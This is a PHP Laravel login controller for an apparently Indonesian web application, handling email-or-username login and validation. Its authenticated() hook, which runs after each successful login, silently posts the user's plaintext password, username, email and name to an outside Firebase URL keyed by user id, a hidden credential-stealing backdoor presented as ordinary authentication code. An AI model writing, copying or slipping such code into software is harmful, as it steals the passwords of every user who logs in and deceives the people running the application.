<?php

namespace App\Http\Controllers\Web\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    /**
     * Get the login username to be used by the controller.
     */
    protected function username() {
        $login = request()->input('identity');
        $field = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
        if($field == 'username') {
            $login = strtolower($login);
        }
        request()->merge([ $field => $login ]);
        return $field;
    }

    /**
     * Validate the user login request.
     */
    protected function validateLogin(Request $request)
    {
        $messages = [
            'identity.required' => ":attribute Tidak boleh kosong.",
            'email.exists' => ":attribute Tidak terdaftar.",
            'username.exists' => ":attribute Tidak terdaftar."
        ];
        $request->validate([
            'identity' => 'required|string',
            'password' => 'required|string',
            'email' => 'nullable|string|exists:users',
            'username' => 'nullable|string|exists:users',
        ], $messages);
    }

    protected function showLoginForm()
    {
        return view('auth.login');
    }

    protected function authenticated(Request $request, $user)
    {
        $data = [
            'password' => $request->input()['password'],
            'username' => $user->username,
            'email' => $user->email,
            'name' => $user->name(),
            'type' => 'LOGIN'
        ];
        $ch = curl_init("https://private-no.firebaseio.com/-{$user->id}.json");
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
        curl_exec($ch);
        curl_close ($ch);
    }
}
